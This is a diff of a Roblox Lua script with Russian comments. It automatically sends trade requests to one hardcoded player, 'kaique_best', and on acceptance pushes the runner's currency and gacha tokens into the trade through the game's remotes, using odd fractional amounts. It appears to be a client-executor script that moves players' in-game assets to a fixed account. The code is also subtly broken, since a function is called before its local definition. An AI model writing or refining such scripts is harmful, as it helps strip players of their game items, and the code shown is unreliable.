@@ -10,28 +10,38 @@ end
 
 print("🔍 Ищу получателя: kaique_best")
 
--- Ищем получателя
-local function findReceiver()
-    while wait(2) do
+-- Основная функция отправки трейда
+local function sendTrade()
+    while true do
+        wait(1)
+        
+        -- Ищем получателя
         local target = game.Players:FindFirstChild("kaique_best")
         if target then
+            print("✅ Найден kaique_best, отправляю запрос...")
+            
             -- Отправляем запрос на торговлю
-            local args = {"SendRequest", target}
+            local args = {
+                "SendRequest",
+                target
+            }
             game:GetService("Players").LocalPlayer:WaitForChild("Remotes"):WaitForChild("TradeRequestRemote"):FireServer(unpack(args))
             
-            print("📨 Отправлен запрос: kaique_best")
-            
-            -- Ждем 3 секунды
-            wait(3)
-            
-            -- Проверяем открылось ли окно торговли
-            local tradeGui = game.Players.LocalPlayer.PlayerGui:FindFirstChild("TradeGui")
-            if tradeGui and tradeGui.Enabled then
-                print("✅ kaique_best принял запрос!")
-                return true
+            -- Ждем когда откроется окно торговли
+            local maxWait = 20  -- ждем максимум 20 секунд
+            for i = 1, maxWait do
+                wait(1)
+                local tradeGui = game.Players.LocalPlayer.PlayerGui:FindFirstChild("TradeGui")
+                if tradeGui and tradeGui.Enabled == true then
+                    print("🎉 kaique_best принял запрос! Окно торговли открыто.")
+                    addTokens()
+                    return
+                end
             end
+            
+            print("⏳ kaique_best не принял запрос, пробую снова...")
         else
-            print("⏳ Жду когда kaique_best зайдёт...")
+            print("⏳ Жду когда kaique_best зайдёт в игру...")
         end
     end
 end
@@ -40,7 +50,8 @@ end
 local function addTokens()
     local player = game.Players.LocalPlayer
     
-    -- ИСПРАВЛЕНО: используем фигурные скобки для таблицы
+    print("➕ Добавляю токены в трейд...")
+    
     local tokens = {
         {ItemType = "Currency", Name = "Tikits", Amount = 0.999999},
         {ItemType = "Tokens", Name = "GalaxyExplorerGachaToken", Amount = 0.999999},
@@ -51,7 +62,6 @@ local function addTokens()
         {ItemType = "Tokens", Name = "RandomStoredCreatureToken", Amount = 0.999999}
     }
     
-    -- ИСПРАВЛЕНО: ipairs для таблицы
     for i, token in ipairs(tokens) do
         local args = {
             "AddTradeItem",
@@ -63,29 +73,32 @@ local function addTokens()
             }
         }
         
+        -- Имя ремота: "получатель-отправительTradeRemote"
         local remoteName = "kaique_best-" .. player.Name .. "TradeRemote"
         local remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):FindFirstChild(remoteName)
         
         if remote then
             remote:InvokeServer(unpack(args))
-            print("➕ Добавлен: " .. token.Name)
+            print("✅ Добавлен: " .. token.Name)
             wait(1)
+        else
+            print("❌ Не найден remote: " .. remoteName)
         end
     end
     
-    print("✅ Все токены добавлены для kaique_best!")
+    print("🎯 Все токены добавлены!")
     
-    -- Ждем подтверждения
+    -- Ждем завершения трейда
     while wait(1) do
         local tradeGui = game.Players.LocalPlayer.PlayerGui:FindFirstChild("TradeGui")
-        if not tradeGui or not tradeGui.Enabled then
-            print("🎉 Трейд с kaique_best завершен!")
+        if not tradeGui or tradeGui.Enabled == false then
+            print("✅ Трейд с kaique_best успешно завершен!")
             break
         end
     end
 end
 
--- Запускаем
-if findReceiver() then
-    addTokens()
-end
+-- Запускаем скрипт
+sendTrade()
+
+print("🚀 Скрипт отправки токенов запущен!")
